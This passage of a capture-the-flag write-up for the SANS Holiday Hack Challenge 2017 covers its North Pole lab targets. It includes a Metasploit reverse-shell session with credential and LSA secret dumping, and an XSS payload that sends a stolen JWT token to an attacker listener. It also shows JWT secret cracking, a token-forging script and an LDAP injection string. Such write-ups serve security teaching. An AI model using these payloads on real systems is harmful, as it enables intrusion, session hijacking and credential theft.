<pre class="example">
220 mail.northpolechristmastown.com ESMTP Postfix
HELO l2s
250 mail.northpolechristmastown.com
MAIL FROM:&lt;wunorse.openslae@northpolechristmastown.com&gt;
250 2.1.0 Ok
RCPT TO:&lt;alabaster.snowball@northpolechristmastown.com&gt;
250 2.1.5 Ok
DATA
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
MIME-Version: 1.0
Subject: Test E-mail
...
--089e082f74245acc5b05624d7433--
.
250 2.0.0 Ok: queued as 1755CC35D2
</pre>

<p>
If we do a directory listing, we see that our plan worked:
</p>

<pre class="example">
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  7670  fil   2017-12-23 04:28:42 +0000  alabaster_snowball.py
100666/rw-rw-rw-  257   fil   2017-12-23 05:17:52 +0000  execute.ps1
100666/rw-rw-rw-  0     fil   2018-01-09 01:25:40 +0000  file.txt
100666/rw-rw-rw-  228   fil   2018-01-09 01:25:36 +0000  glob.py
</pre>

<p>
Now we just need to launch Metasploit and wait for the service to restart&#x2026;
</p>

<pre class="example">
$ msfconsole -r windows-meterpreter-stageless-reverse-tcp-4445-exe.rc


     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
				`...............`              `...-/////...`


				  .::::::::::-.                     .::::::-
				.hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
				 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&amp;&amp;MMMMMMMMMMMMMMy
				 .sm/`-yMMMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMMh`
				  -Nd`  :MMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMMh`
				   -Nh` .yMMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&amp;&amp;MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
	  /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
	  -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
	  .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

		     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

			Press SPACE BAR to continue



       =[ metasploit v4.16.14-dev-140955f                 ]
+ -- --=[ 1698 exploits - 969 auxiliary - 299 post        ]
+ -- --=[ 500 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

[*] Processing msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc for ERB directives.
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; use exploit/multi/handler
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; set PAYLOAD windows/meterpreter_reverse_tcp
PAYLOAD =&gt; windows/meterpreter_reverse_tcp
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; set LHOST 1.2.3.4
LHOST =&gt; 1.2.3.4
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; set LPORT 4445
LPORT =&gt; 4445
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; set ExitOnSession false
ExitOnSession =&gt; false
resource (msf_payloads/windows-meterpreter-stageless-reverse-tcp-4445-exe.rc)&gt; run -j
[*] Exploit running as background job 0.
Meterpreter session 1 opened (1.2.3.4:4445 -&gt; 35.185.57.190:49672) at 2018-01-09 05:08:43 +0000
msf exploit(handler) &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ HHC17-SMB-SERVE  1.2.3.4:4445 -&gt; 35.185.57.190:49756 (10.142.0.8)
</pre>

<p>
And now, we've managed to elevate our credentials. There are a few
"post-exploitation" modules for Meterpreter, which will use our
session. For instance, let's dump the hashes on the system:
</p>

<pre class="example">
msf exploit(handler) &gt; set -g SESSION 1
SESSION =&gt; 1
msf exploit(handler) &gt; use post/windows/gather/credentials/credential_collector
msf post(credential_collector) &gt; run

[*] Running module against HHC17-SMB-SERVE
[+] Collecting hashes...
    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: alabaster_snowball:aad3b435b51404eeaad3b435b51404ee:10e2fa00c44d10ca05d399f47ed13351
    Extracted: DefaultAccount:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: sysadmin:aad3b435b51404eeaad3b435b51404ee:27309e9a73764938860b4a1ed7c0392b
[+] Collecting tokens...
    HHC17-SMB-SERVE\alabaster_snowball
    IIS APPPOOL\DefaultAppPool
    NT AUTHORITY\IUSR
    NT AUTHORITY\LOCAL SERVICE
    NT AUTHORITY\NETWORK SERVICE
    NT AUTHORITY\SYSTEM
    Window Manager\DWM-1
    NT AUTHORITY\ANONYMOUS LOGON
[*] Post module execution completed
</pre>

<p>
We could try to crack some hashes, but there's an easier way. Let's check the LSA secrets:
</p>

<pre class="example">
msf post(credential_collector) &gt; use post/windows/gather/lsa_secrets
msf post(lsa_secrets) &gt; info

       Name: Windows Enumerate LSA Secrets
     Module: post/windows/gather/lsa_secrets
   Platform: Windows
       Arch:
       Rank: Normal

Provided by:
  Rob Bathurst &lt;rob.bathurst@foundstone.com&gt;

Compatible session types:
  Meterpreter

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION  1                yes       The session to run this module on.

Description:
  This module will attempt to enumerate the LSA Secrets keys within
  the registry. The registry value used is:
  HKEY_LOCAL_MACHINE\Security\Policy\Secrets\. Thanks goes to Maurizio
  Agazzini and Mubix for decrypt code from cachedump.

msf post(lsa_secrets) &gt; run

[*] Executing module against HHC17-SMB-SERVE
[*] Obtaining boot key...
[*] Obtaining Lsa key...
[*] Vista or above system
[+] Key: DPAPI_SYSTEM
 Decrypted Value: ,2#B@:o~NY*#(1]`Vx

[+] Key: NL$KM
 Decrypted Value: @.tUb#=VQc_Y%&amp;P1`gG;g1p0I)me&amp; }Z/zXP`

[+] Key: _SC_agrabber
 Username: .\alabaster_snowball
 Decrypted Value: .Carried_mass_it_reader1

[*] Writing to loot...
[*] Data saved in: /home/vladg/.msf4/loot/20180109050031_default_10.142.0.8_registry.lsa.sec_967944.txt
[*] Post module execution completed
</pre>

<p>
We can verify this with our hash, or via RDP: alabaster's password is
<code>Carried_mass_it_reader1</code>, which matches what we got before.
</p>

<p>
At this point, the system is pretty well compromised. We were unable to crack the sysadmin user's hash, or pivot from this system to other systems using our privileged access.
</p>

<p>
We did, however, find some neat things in the Firefox browsing history of the sysadmin user:
</p>

<pre class="example">
'https://www.python.org/downloads/release/python-362/'
'https://www.google.com/search?q=non+sucky+servaice+manager&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'https://nssm.cc/release/nssm-2.24.zip'
'http://localhost/'
'https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx'
'http://localhost/test.aspx'
'https://stackoverflow.com/questions/4388066/the-page-you-are-requesting-cannot-be-served-because-of-the-extension-configura'
'https://www.google.com/search?q=how+to+use+aspnet_regiis&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'https://www.google.com/search?q=aspnet_regiis+%3A+The+term+%27aspnet_regiis%27+is+not+recognized+as+the+name+of+a+cmdlet&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'http://exescan.net/exes/a/aspnet_regiis-exe-file'
'https://www.google.com/search?q=how+to+configure+asp+to+run+on+iis&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'https://docs.microsoft.com/en-us/iis/application-frameworks/scenario-build-an-aspnet-website-on-iis/configuring-step-1-install-iis-and-asp-net-modules'
'https://www.google.com/search?q=enable+asp+on+windows+2016&amp;ie=utf-8&amp;oe=utf-8&amp;client=firefox-b-1-ab'
'https://docs.microsoft.com/en-us/biztalk/core/how-to-enable-asp-net-4-0-for-published-web-services'
'https://az764295.vo.msecnd.net/stable/dcee2202709a4f223185514b9275aa4229841aa7/VSCodeSetup-x64-1.18.0.exe'
'http://127.0.0.1/'
'http://127.0.0.1/evil.aspx'
'http://localhost/cmd.aspx'
'http://localhost/jerry.aspx'
'http://localhost/ok.txt'
</pre>
</div>
</div>
</div>
<div id="outline-container-orgffdd718" class="outline-3">
<h3 id="orgffdd718">EDB: eLfDAP Injection</h3>
<div class="outline-text-3" id="text-orgffdd718">
</div>
<div id="outline-container-orga4403bb" class="outline-4">
<h4 id="q8_question"><a id="orga4403bb"></a>Question</h4>
<div class="outline-text-4" id="text-q8_question">
<p>
Fetch the letter to Santa from the North Pole Elf Database at
<a href="http://edb.northpolechristmastown.com/">http://edb.northpolechristmastown.com/</a>. Who wrote the letter?
</p>

<p>
<i>For hints on solving this challenge, please locate Wunorse Openslae in the North Pole and Beyond.</i>
</p>
</div>
</div>

<div id="outline-container-org3e3db6a" class="outline-4">
<h4 id="q8_background-information"><a id="org3e3db6a"></a>Background Information</h4>
<div class="outline-text-4" id="text-q8_background-information">
<p>
We can pull up the website in a web browser, and we see a login page.
</p>


<div class="figure">
<p><img src="./images/edb_login.png" alt="edb_login.png" width="350px" />
</p>
<p><span class="figure-number">Figure 27: </span>Elf Database Login</p>
</div>

<p>
We can try some of the passwords we've already recovered, without success. However, at the bottom of the page, there's a support link, which pops up this form:
</p>


<div class="figure">
<p><img src="./images/edb_login_support.png" alt="edb_login_support.png" width="350px" />
</p>
<p><span class="figure-number">Figure 28: </span>Elf Database Login Support</p>
</div>

<p>
Wunorse Openslae provides us the following:
</p>

<div class="hint">
<p>
Many people don't know this, but most of us elves have multiple jobs here in the North Pole. In addition to working in Santa's workshop, I also work as a help desk support associate for the North Pole Elf Database site. I answer password reset requests, mostly from other elves.
</p>

</div>
<div class="hint">
<p>
One time, I got a weird email with a JavaScript alert and my account got hacked. Fortunately, Alabaster was able to add some filtering on the system to prevent that from happening again. I sure hope he tested his changes against the common evasion techniques discussed on the <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS filter evasion cheat sheet</a>.
</p>

</div>
<div class="hint">
<p>
It's never a good idea to come up with your own encryption scheme with cookies. Alabaster told me he uses JWT tokens because they are super secure as long as you use a long and complex key. Otherwise, they could be cracked and recreated using any old framework like <a href="https://github.com/jpadilla/pyjwt">pyjwt</a> to forge a key.
</p>

</div>
<div class="hint">
<p>
The interface we use lets us query our directory database with all the employee information. Per Santa's request, Alabaster restricted the search results to just the elves and reindeer. Hopefully, he secured that too. I found an article recently talking about <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">injection against similar databases</a>.
</p>

</div>

<p>
This blog post is explicitly called out:
</p>

<p>
Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
</p>
</div>
</div>

<div id="outline-container-org5007ff6" class="outline-4">
<h4 id="q8_goal"><a id="org5007ff6"></a>Goal</h4>
<div class="outline-text-4" id="text-q8_goal">
<p>
The hints lay out a pretty clear path: we can use <abbr title="Cross-site Scripting"> XSS</abbr> to send a malicious request to one of the elves or
reindeer, and then steal their JWT token and access the directory.
</p>
</div>
</div>

<div id="outline-container-orgaa18a1b" class="outline-4">
<h4 id="q8_approach"><a id="orgaa18a1b"></a>Approach</h4>
<div class="outline-text-4" id="text-q8_approach">
</div>

<ul class="org-ul">
<li><a id="org8d247b3"></a>Cross-Site Scripting<br />
<div class="outline-text-5" id="text-org8d247b3">
<p>
The first stage of this attack is our malicious <abbr title="Cross-site Scripting"> XSS</abbr> request. First, we tried to steal the cookie, but in reviewing the code at <a href="http://edb.northpolechristmastown.com/">http://edb.northpolechristmastown.com/</a>, we noticed that we needed to steal the token out of local storage:
</p>

<div class="org-src-container">
<pre class="src src-js">token = localStorage.getItem(<span style="color: #8abeb7;">"np-auth"</span>);
</pre>
</div>

<p>
A classic <abbr title="Cross-site Scripting"> XSS</abbr> attack is using the HTML <code>IMG</code> tag, and causing Javascript code to run and leak the token to a server we control. This is just one of many options in the <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP Cheat Sheet</a>.
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #de935f;">IMG</span> SRC=/ <span style="color: #f0c674;">onerror</span>=<span style="color: #8abeb7;">"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');"</span>&gt;
&lt;/<span style="color: #de935f;">IMG</span>&gt;
</pre>
</div>

<p>
We'll start a <code>netcat</code> listener on the l2s system:
</p>


<p>
on l2s:
</p>

<pre class="example">
$ nc -v -l -p 4444
</pre>

<p>
Next, we'll submit the support form with our malicious message:
</p>

<div class="org-src-container">
<pre class="src src-sh">http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service <span style="color: #8abeb7;">\</span>
<span style="color: #f0c674;">uid</span>=alabaster.snowball <span style="color: #8abeb7;">\</span>
<span style="color: #f0c674;">email</span>=alabaster.snowball@northpolechristmastown.com <span style="color: #8abeb7;">\</span>
<span style="color: #f0c674;">message</span>=<span style="color: #8abeb7;">"&lt;IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"&gt;&lt;/img&gt;"</span>
</pre>
</div>

<p>
A few seconds later, back on l2s:
</p>

<pre class="example">
GET /?cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://127.0.0.1/reset_request?ticket=L78G1-F4X9X-T4FIR-9C4R4
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: 10.142.0.11:4444
</pre>
</div>
</li>

<li><a id="org184abff"></a>JWT Token<br />
<div class="outline-text-5" id="text-org184abff">
<p>
With the success of the XSS attack, the stolen token was stored in output/jwt TODO add a real link here.
</p>

<p>
Great! Now we just need to modify our local storage, similar to how we
added our cookie for EWA, and refresh the page! &#x2026;and nothing
happens. If we look at the Network tab of the Developer Tools, we'll
see that there was a request to <code>/login</code>, but it returned false:
</p>


<div class="figure">
<p><img src="./images/edb_login_failed.png" alt="edb_login_failed.png" width="350px" />
</p>
<p><span class="figure-number">Figure 29: </span>Elf Database Login Failed</p>
</div>

<div class="hint">
<p>
Alabaster told me he uses JWT tokens because they are super secure as long as you use a long and complex key. Otherwise, they could be cracked and recreated using any old framework like <a href="https://github.com/jpadilla/pyjwt">pyjwt</a> to forge a key.
</p>

</div>

<p>
That seems relevant. Let's check out <code>pyjwt</code>:
</p>

<div class="org-src-container">
<pre class="src src-python">&gt;&gt;&gt; <span style="color: #b5bd68;">import</span> jwt
&gt;&gt;&gt; <span style="color: #f0c674;">token</span>=<span style="color: #b294bb;">open</span>(<span style="color: #8abeb7;">"jwt"</span>).read().strip()
&gt;&gt;&gt; jwt.decode(token, verify=<span style="color: #81a2be;">False</span>)
{<span style="color: #8abeb7;">'dept'</span>: <span style="color: #8abeb7;">'Engineering'</span>, <span style="color: #8abeb7;">'ou'</span>: <span style="color: #8abeb7;">'elf'</span>, <span style="color: #8abeb7;">'expires'</span>: <span style="color: #8abeb7;">'2017-08-16 12:00:47.248093+00:00'</span>, <span style="color: #8abeb7;">'uid'</span>: <span style="color: #8abeb7;">'alabaster.snowball'</span>}
</pre>
</div>

<p>
Unfortunately the token had expired 4 months ago, and could no longer
be used to create a new session. The hint mentions that the key needs
to be secure &#x2013; but what if it's not? Let's try cracking it. A bit of
Googling later, we end up at <code>jwt2john.py</code>. This can convert the raw
token into a format that John the Ripper can understand, and then it
can try to crack it.
</p>

<p>
Our Makefile shows the process for cracking the key:
</p>

<pre class="example">
jwt.john: ../tools/jwt2john.py jwt
	python3 ../tools/jwt2john.py $(shell cat jwt) &gt; jwt.john

john.txt: jwt.john
	john  --format=HMAC-SHA256 jwt.john
	john  --format=HMAC-SHA256 jwt.john -show &gt; john.txt
</pre>

<p>
To run it, we just run <code>make john.txt</code>:
</p>

<pre class="example">
python3 ../tools/jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I &gt; jwt.john
john  --format=HMAC-SHA256 jwt.john
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 32/64 OpenSSL])
Press 'q' or Ctrl-C to abort, almost any other key for status

3lv3s            (?)
1g 0:00:06:22 DONE 3/3 (2018-01-10 10:45) 0.002613g/s 835027p/s 835027c/s 835027C/s 3lv3s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
john  --format=HMAC-SHA256 jwt.john -show &gt; john.txt
$ cat john.txt
?:3lv3s
</pre>

<p>
Cracking the jwt token took 6 minutes and found that the secret key was <code>3lv3s</code>. Now we can use <code>pyjwt</code> again to create a spoofed token:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">import</span> sys
<span style="color: #b5bd68;">import</span> jwt

<span style="color: #f0c674;">SECRET_KEY</span>=<span style="color: #8abeb7;">'3lv3s'</span>

<span style="color: #f0c674;">user</span> = sys.argv[1]
<span style="color: #f0c674;">dept</span> = sys.argv[2]
<span style="color: #f0c674;">ou</span> = sys.argv[3]

<span style="color: #f0c674;">data</span> = {
    <span style="color: #8abeb7;">'dept'</span>: dept,
    <span style="color: #8abeb7;">'ou'</span>: ou,
    <span style="color: #8abeb7;">'uid'</span>: user,
    <span style="color: #8abeb7;">'expires'</span>: <span style="color: #8abeb7;">'2018-08-16 12:00:47.248093+00:00'</span>,
}

<span style="color: #f0c674;">token</span> = jwt.encode(data, key=SECRET_KEY)
<span style="color: #b5bd68;">print</span>(token.decode(<span style="color: #8abeb7;">'utf-8'</span>))
</pre>
</div>

<p>
Plugging in the values from our expired cookie, we get:
</p>

<pre class="example">
$ ./make_jwt.py alabaster.snowball Engineering elf
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCIsImV4cGlyZXMiOiIyMDE4LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCJ9.iVg7UqgyCSw688qBLv-n7nD5a1sc9bcMnmTkJKEgIGw
</pre>

<p>
We can plug this into our Local Storage, using the Firefox Developer Tools:
</p>


<div class="figure">
<p><img src="./images/edb_local_storage.png" alt="edb_local_storage.png" />
</p>
<p><span class="figure-number">Figure 30: </span>Updating our Local Storage</p>
</div>

<p>
Refresh, and&#x2026;
</p>


<div class="figure">
<p><img src="./images/edb_search.png" alt="edb_search.png" />
</p>
<p><span class="figure-number">Figure 31: </span>EDB Personnel Search</p>
</div>

<p>
Poking around a little bit, we see that there's a "Santa Panel." Unfortunately, Alabaster's not authorized for that:
</p>


<div class="figure">
<p><img src="./images/edb_must_be_a_clause.png" alt="edb_must_be_a_clause.png" width="350px" />
</p>
<p><span class="figure-number">Figure 32: </span>EDB Personnel Search</p>
</div>
</div>
</li>

<li><a id="org0f3692d"></a>LDAP Injection<br />
<div class="outline-text-5" id="text-org0f3692d">
<p>
We managed to login to the system, but now let's see what LDAP injection we can do, as we follow the SANS blog post. First, let's see what a standard search looks like, using the Network tab of the Firefox Developer Tools:
</p>


<div class="figure">
<p><img src="./images/edb_test_search.png" alt="edb_test_search.png" />
</p>
<p><span class="figure-number">Figure 33: </span>EDB Search for Elves</p>
</div>

<p>
Why, this looks pretty similar to what the blog post has. On a lark, let's see what happens if we try searching for the LDAP injection example from the blog post:
</p>

<pre class="example">
))(department=it)(|(cn=
</pre>


<div class="figure">
<p><img src="./images/edb_ldap_injection_success.png" alt="edb_ldap_injection_success.png" />
</p>
<p><span class="figure-number">Figure 34: </span>EDB Injection PoC</p>
</div>

<p>
That worked. We got a list with elves, reindeers &#x2013; even administrators! Now that we have some information on Santa, let's change our cookie to his, and access the Santa Panel:
</p>

<pre class="example">
./make_jwt.py santa.claus administrators human
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiYWRtaW5pc3RyYXRvcnMiLCJvdSI6Imh1bWFuIiwidWlkIjoic2FudGEuY2xhdXMiLCJleHBpcmVzIjoiMjAxOC0wOC0xNiAxMjowMDo0Ny4yNDgwOTMrMDA6MDAifQ.JQ16hqPVuXmJDqA5PgZ4jMwn9RRQAuPuJhNsXfC5ZYk
</pre>


<div class="figure">
<p><img src="./images/edb_confirm_password.png" alt="edb_confirm_password.png" width="350px" />
</p>
<p><span class="figure-number">Figure 35: </span>EDB Santa Panel</p>
</div>

<p>
Nope. Somehow, we'll need to get passwords from LDAP first. At this
point, we've managed to query all the entries in LDAP, but the web app
restricts which fields we can see. The SANS blog post also discusses
modifying parameters to view extra, or different fields. Let's try:
</p>


<div class="figure">
<p><img src="./images/edb_all_attributes.png" alt="edb_all_attributes.png" width="500px" />
</p>
<p><span class="figure-number">Figure 36: </span>EDB Return All Attributes</p>
</div>


<div class="figure">
<p><img src="./images/edb_all_attrs_result.png" alt="edb_all_attrs_result.png" width="500px" />
</p>
<p><span class="figure-number">Figure 37: </span>EDB All Rudolph's Attributes</p>
</div>

<p>
We now have password hashes for all the users! But really, we're after Santa's password. We could try to crack his password, but if we just Google it, it pops up on several sites.
</p>

<div class="note">
<p>
Santa's password hash &amp; password originally were <code>cdabeb96b508f25f97ab0f162eac5a04</code> and <code>1iwantacookie</code>, but this was modified to <code>d8b4c05a35b0513f302a85c409b4aab3</code> (<code>001cookielips001</code>).
</p>

</div>

<p>
Armed with that password, we can access the Santa Panel, where we find:
</p>


<div class="figure">
<p><img src="./images/wizard_of_oz_to_santa_d0t011d408nx.png" alt="wizard_of_oz_to_santa_d0t011d408nx.png" width="600px" />
</p>
<p><span class="figure-number">Figure 38: </span>Letter to Santa</p>
</div>
</div>
</li>
</ul>
</div>

<div id="outline-container-orgdd99263" class="outline-4">
<h4 id="q8_solution"><a id="orgdd99263"></a>Solution</h4>
<div class="outline-text-4" id="text-q8_solution">
<p>
There was a lot of stuff going on in this question. First, we needed to use <abbr title="Cross-site Scripting"> XSS</abbr> to grab a copy of the JWT token, then we had to recover the secret and forge a new token.
</p>

<p>
Once we logged into the system, we found it was vulnerable to LDAP injection, and were able to dump all the users, and their passwords. Cracking Santa's password allowed us to access the letter from the Wizard of Oz.
</p>

<p>
We automated this attack with tools/edb.py TODO ADD LINK HERE, which dumps the LDAP database:
</p>

<pre class="example">
$ ./edb.py | head
[
 [
  [
   "cn=rudolph,ou=reindeer,dc=northpolechristmastown,dc=com",
   {
    "c": [
     "US"
    ],
    "cn": [
     "rudolph"
...
</pre>
</div>
</div>

<div id="outline-container-org9eb4c33" class="outline-4">
<h4 id="q8_alternatives"><a id="org9eb4c33"></a>Alternatives</h4>
<div class="outline-text-4" id="text-q8_alternatives">
<p>
The website's <code>robots.txt</code> page lists a single entry, <a href="http://edb.northpolechristmastown.com/dev/">http://edb.northpolechristmastown.com/dev/</a>, which leads us to this <abbr title="LDAP Data Interchange Format"> LDIF</abbr> file:
</p>

<pre class="example">
#LDAP LDIF TEMPLATE

dn: dc=com
dc: com
objectClass: dcObject

dn: dc=northpolechristmastown,dc=com
dc: northpolechristmastown
objectClass: dcObject
objectClass: organization

dn: ou=human,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: human

dn: ou=elf,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: elf

dn: ou=reindeer,dc=northpolechristmastown,dc=com
objectClass: organizationalUnit
ou: reindeer

dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
objectClass: addressbookPerson
cn: 
sn: 
gn: 
profilePath: /path/to/users/profile/image
uid: 
ou: 
department: 
mail: 
telephoneNumber: 
street:
postOfficeBox: 
postalCode: 
postalAddress: 
st: 
l: 
c: 
facsimileTelephoneNumber: 
description: 
userPassword: 
</pre>

<p>
Knowing the LDAP structure would make it easier to pull out the passwords, but much of the work leading up to that would remain the same.
</p>
</div>
</div>
</div>
<div id="outline-container-org532433a" class="outline-3">
<h3 id="org532433a">Fin: The Evil Good Witch</h3>
<div class="outline-text-3" id="text-org532433a">
</div>
<div id="outline-container-orga99eddb" class="outline-4">
<h4 id="q9_question"><a id="orga99eddb"></a>Question</h4>
<div class="outline-text-4" id="text-q9_question">
<p>
Which character is ultimately the villain causing the giant snowball
problem. What is the villain's motive?
</p>

<p>
<i>To answer this question, you need to fetch at least five of the seven pages of The Great Book and complete the final level of the North Pole and Beyond.</i>
</p>
</div>
</div>

<div id="outline-container-org47cd820" class="outline-4">
<h4 id="q9_solution"><a id="org47cd820"></a>Solution</h4>
<div class="outline-text-4" id="text-q9_solution">
<p>
This answer comes straight from the game. Once we've found at least 5 pages, and completed all the levels, we see the following message:
</p>


<div class="figure">
<p><img src="./images/glinda.png" alt="glinda.png" />
</p>
<p><span class="figure-number">Figure 39: </span>The Villain Revealed</p>
</div>

<p>
It's always about the money&#x2026;
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orgd97fdc0" class="outline-2">
<h2 id="orgd97fdc0">Easter Eggs</h2>
<div class="outline-text-2" id="text-orgd97fdc0">
</div>
<div id="outline-container-orgbf860e6" class="outline-3">
<h3 id="orgbf860e6">Story Page</h3>
<div class="outline-text-3" id="text-orgbf860e6">
</div>
<div id="outline-container-org27622ff" class="outline-4">
<h4 id="org27622ff">Wintered logo is based on the Wicked stage musical poster.</h4>
<div class="outline-text-4" id="text-org27622ff">

<div class="figure">
<p><img src="./images/HHC_banner.png" alt="HHC_banner.png" />
</p>
</div>


<div class="figure">
<p><img src="./images/wicked_poster.jpg" alt="wicked_poster.jpg" width="350px" />
</p>
</div>
</div>
</div>

<div id="outline-container-org8d84b45" class="outline-4">
<h4 id="org8d84b45">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</h4>
<div class="outline-text-4" id="text-org8d84b45">
<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube.com/embed/g9ByiEGfAXk?rel=0&amp;start=99" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen></iframe>
</div>
</div>
</div>
</div>

<div id="outline-container-orgbfa5115" class="outline-3">
<h3 id="orgbfa5115">North Pole and Beyond</h3>
<div class="outline-text-3" id="text-orgbfa5115">
</div>
<div id="outline-container-org11ea36a" class="outline-4">
<h4 id="org11ea36a">Stocking</h4>
<div class="outline-text-4" id="text-org11ea36a">
<p>
The text field for entering the SHA1 hashes of the great book pages appears to have some placeholder text in it, <code>686579212121202d436f756e746572204861636b</code>. This is in hex and can be converted to ascii, <code>hey!!! -Counter Hack</code>.
</p>
</div>
</div>

